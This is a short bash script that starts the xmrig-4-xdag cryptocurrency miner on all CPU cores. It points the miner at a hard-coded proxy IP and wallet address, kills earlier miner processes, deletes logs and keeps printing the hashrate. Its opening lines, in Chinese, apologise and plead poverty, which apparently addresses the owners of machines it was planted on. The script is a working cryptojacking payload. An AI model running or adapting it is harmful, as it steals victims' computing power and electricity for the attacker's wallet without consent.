#!/bin/bash

echo "对不起,对不起,对不起,重要的事情说三遍..."
echo "同是运维岗,失业一年之久,没钱吃饭了,搞点泡面吃,绕我一命,感谢,万分感谢."

ProxyIP="203.12.201.162:5432"
Wallet="8qdb2c1qfrL19R83mux1LdmGRgBASrqmm"
RunLog="/root/xdagminer/Run.log"

pkill -9 xmrig-4-xdag 2>/dev/null
rm -rf Run.log 2>/dev/null

CORES=$(cat /proc/cpuinfo | grep "processor" | wc -l)
./xmrig-4-xdag -a xdag -o $ProxyIP --user $Wallet -p X86 -t $CORES --donate-level 0 --log-file $RunLog --print-time 1 -B
    while true
    do
      cpu_accepted=$(tail -n 10 Run.log | grep "cpu      accepted" | tail -n 1)
      miner_speed=$(tail -n 10 Run.log | grep "miner    speed" | tail -n 1)
      echo -e "\e[1;32mxmrig-4-xdag_X86　　$CORES　$cpu_accepted\e[0m"
      echo -e "\e[1;36mxmrig-4-xdag_X86　　$CORES　$miner_speed\e[0m"
      sleep 1
    done

